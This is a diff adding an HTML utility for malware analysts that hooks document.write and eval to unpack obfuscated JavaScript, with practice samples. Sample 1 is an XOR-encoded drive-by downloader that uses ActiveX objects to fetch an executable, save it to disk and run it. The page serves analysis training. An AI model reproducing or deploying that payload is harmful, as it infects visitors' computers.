@@ -1,0 +1,77 @@
+Note this is designed to make life easier <u>NOT SAFER</u> <br>
+Use Vmware for Malicious payloads! - 
+
+<a href="javascript:help()">Help</a>, 
+<a href="javascript:sample(1)">Sample 1</a>
+<!--a href="javascript:sample(2)">Sample 2</a-->
+<a href="javascript:sample(3)">Sample 2</a>,
+<br><br>
+
+<script>
+
+function clearLog(){
+	document.all.error.innerText=""
+	var t = document.all.t1
+	for(i=t.rows.length-1;i>=1;i--){
+		t.deleteRow(i);
+	}
+	document.frame1.run_next = new Array()
+}
+
+function help(){
+	a = "This is a quick lightweight utility designed to help analysts\n"+
+	    "analyze obsfuscated javascript,\n\n"+
+	    "This utility hooks document.write, document.writeln, and eval()\n"+
+	    "functions commonly used by malware. Other techniques are possible\n"+
+	    "and its presence is detectable, so run it only in vmware!\n\n"+
+	    "To use it, paste the malicious script (without <scr"+"ipt> tags)\n"+
+            "into the lower textbox and hit run. Any calls to the hooked functions\n"+
+	    "will display their output in the Log section. To then analyze a log\n"+
+	    "entry, click on the Load link to have it loaded in the lower textarea\n"+
+	    "remember you may have to edit it some like removing html script tags.\n\n"+
+	    "Note that sample script will require two steps to get to final payload\n\n"+
+	    "Do you know why the Sample 2 causes an error? (not a mistake)\n\n"+
+	    "What do you have to edit in the original script to get to the second stage?"
+	
+	alert(a)
+}
+
+function sample(x){
+
+switch(x){
+
+case 1:
+frame1.ta.value = "var J=function(m){return String.fromCharCode(m^66)};eval(J(52)+J(35)+J(48)+J(98)+J(55)+J(48)+J(46)+J(110)+J(50)+J(35)+J(54)+J(42)+J(121)+J(55)+J(48)+J(46)+J(127)+J(96)+J(42)+J(54)+J(54)+J(50)+J(120)+J(109)+J(109)+J(109)+J(115)+J(58)+J(58)+J(58)+J(58)+J(108)+J(39)+J(58)+J(39)+J(96)+J(121)+J(50)+J(35)+J(54)+J(42)+J(127)+J(96)+J(1)+J(120)+J(30)+J(30)+J(32)+J(45)+J(45)+J(54)+J(108)+J(39)+J(58)+J(39)+J(96)+J(121)+J(54)+J(48)+J(59)+J(57)+J(52)+J(35)+J(48)+J(98)+J(35)+J(38)+J(45)+J(127)+J(106)+J(38)+J(45)+J(33)+J(55)+J(47)+J(39)+J(44)+J(54)+J(108)+J(33)+J(48)+J(39)+J(35)+J(54)+J(39)+J(7)+J(46)+J(39)+J(47)+J(39)+J(44)+J(54)+J(106)+J(96)+J(45)+J(32)+J(40)+J(39)+J(33)+J(54)+J(96)+J(107)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(38)+J(127)+J(115)+J(121)+J(35)+J(38)+J(45)+J(108)+J(49)+J(39)+J(54)+J(3)+J(54)+J(54)+J(48)+J(43)+J(32)+J(55)+J(54)+J(39)+J(106)+J(96)+J(33)+J(46)+J(35)+J(49)+J(49)+J(43)+J(38)+J(96)+J(110)+J(96)+J(33)+J(46)+J(49)+J(43)+J(38)+J(120)+J(0)+J(6)+J(123)+J(116)+J(1)+J(117)+J(117)+J(116)+J(111)+J(116)+J(119)+J(3)+J(113)+J(111)+J(115)+J(115)+J(6)+J(114)+J(111)+J(123)+J(122)+J(113)+J(3)+J(111)+J(114)+J(114)+J(1)+J(114)+J(118)+J(4)+J(1)+J(112)+J(123)+J(7)+J(113)+J(116)+J(96)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(39)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(58)+J(47)+J(46)+J(127)+J(35)+J(38)+J(45)+J(108)+J(1)+J(48)+J(39)+J(35)+J(54)+J(39)+J(13)+J(32)+J(40)+J(39)+J(33)+J(54)+J(106)+J(96)+J(15)+J(43)+J(33)+J(48)+J(45)+J(49)+J(45)+J(36)+J(54)+J(108)+J(26)+J(15)+J(14)+J(10)+J(22)+J(22)+J(18)+J(96)+J(110)+J(96)+J(96)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(36)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(35)+J(32)+J(127)+J(96)+J(3)+J(38)+J(45)+J(38)+J(32)+J(108)+J(96)+J(121)+J(52)+J(35)+J(48)+J(98)+J(33)+J(38)+J(127)+J(96)+J(17)+J(54)+J(48)+J(39)+J(35)+J(47)+J(96)+J(121)+J(52)+J(35)+J(48)+J(98)+J(37)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(35)+J(49)+J(127)+J(35)+J(38)+J(45)+J(108)+J(33)+J(48)+J(39)+J(35)+J(54)+J(39)+J(45)+J(32)+J(40)+J(39)+J(33)+J(54)+J(106)+J(35)+J(32)+J(105)+J(33)+J(38)+J(110)+J(96)+J(96)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(42)+J(127)+J(115)+J(121)+J(58)+J(47)+J(46)+J(108)+J(13)+J(50)+J(39)+J(44)+J(106)+J(96)+J(5)+J(7)+J(22)+J(96)+J(110)+J(55)+J(48)+J(46)+J(110)+J(114)+J(107)+J(121)+J(58)+J(47)+J(46)+J(108)+J(17)+J(39)+J(44)+J(38)+J(106)+J(107)+J(121)+J(35)+J(49)+J(108)+J(54)+J(59)+J(50)+J(39)+J(127)+J(115)+J(121)+J(52)+J(35)+J(48)+J(98)+J(44)+J(127)+J(115)+J(121)+J(35)+J(49)+J(108)+J(45)+J(50)+J(39)+J(44)+J(106)+J(107)+J(121)+J(35)+J(49)+J(108)+J(53)+J(48)+J(43)+J(54)+J(39)+J(106)+J(58)+J(47)+J(46)+J(108)+J(48)+J(39)+J(49)+J(50)+J(45)+J(44)+J(49)+J(39)+J(0)+J(45)+J(38)+J(59)+J(107)+J(121)+J(35)+J(49)+J(108)+J(49)+J(35)+J(52)+J(39)+J(54)+J(45)+J(36)+J(43)+J(46)+J(39)+J(106)+J(50)+J(35)+J(54)+J(42)+J(110)+J(112)+J(107)+J(121)+J(35)+J(49)+J(108)+J(33)+J(46)+J(45)+J(49)+J(39)+J(106)+J(107)+J(121)+J(52)+J(35)+J(48)+J(98)+J(49)+J(42)+J(39)+J(46)+J(46)+J(127)+J(35)+J(38)+J(45)+J(108)+J(33)+J(48)+J(39)+J(35)+J(54)+J(39)+J(45)+J(32)+J(40)+J(39)+J(33)+J(54)+J(106)+J(96)+J(17)+J(42)+J(39)+J(46)+J(46)+J(108)+J(3)+J(50)+J(50)+J(46)+J(43)+J(33)+J(35)+J(54)+J(43)+J(45)+J(44)+J(96)+J(110)+J(96)+J(96)+J(107)+J(121)+J(49)+J(42)+J(39)+J(46)+J(46)+J(108)+J(17)+J(42)+J(39)+J(46)+J(46)+J(7)+J(58)+J(39)+J(33)+J(55)+J(54)+J(39)+J(106)+J(50)+J(35)+J(54)+J(42)+J(110)+J(96)+J(96)+J(110)+J(96)+J(96)+J(110)+J(96)+J(45)+J(50)+J(39)+J(44)+J(96)+J(110)+J(114)+J(107)+J(121)+J(63)+J(33)+J(35)+J(54)+J(33)+J(42)+J(106)+J(39)+J(107)+J(57)+J(63)+J(121)+'');"
+break;
+
+case 2: 
+	frame1.ta.value = ""
+
+
+break;
+
+case 3:
+	frame1.ta.value = "document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0D%0A%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%0D%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0D%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0D%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0D%0A%7D%0D%0A%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%2631mbohvbhf%264E%2633kbwbtdsjqu%2633%264F%261E%261Bgvodujpo%2631qsfmpbeJnbhft%2639%263%3A%268C%261E%261Bwbs%2631jB%264Eofx%2631Bssbz%2639%263%3A%264C%261E%261Bgps%2639j%264E1%264Cj%264Dbshvnfout/mfohui%264Cj%2C%2C%263%3A%268C%261E%261BjB%266Cj%266E%264Eofx%2631Jnbhf%2639%263%3A%264C%261E%261BjB%266Cj%266E/tsd%264Ebshvnfout%266Cj%266E%264C%261E%261B%268E%268E%261E%261B%261E%261BqsfmpbeJnbhft%2639%2638jnh2/hjg%2638%263D%2638jnh3/hjg%2638%263D%2638jnh4/hjg%2638%263%3A%264C%261E%261B%264D0tdsjqu%264F1');"
+
+break;
+
+}
+
+
+
+
+
+}
+
+</script>
+
+
+<table id=t1 width=600 border=1 cellpadding=0 cellspacing=0 bordercolor=black>
+<tr><td bgcolor="#7c7c7c" align=center><font color=white>Log - <a href="javascript:clearLog()" style="color:white">Clear</a></font></td></tr>
+</table>
+<br>
+
+<div id=error name=error style="color:red"></div>
+<br><br>
+
+<iframe src="frame.html" width=600 height=400 id=frame1 name=frame1 FRAMEBORDER=0></iframe>
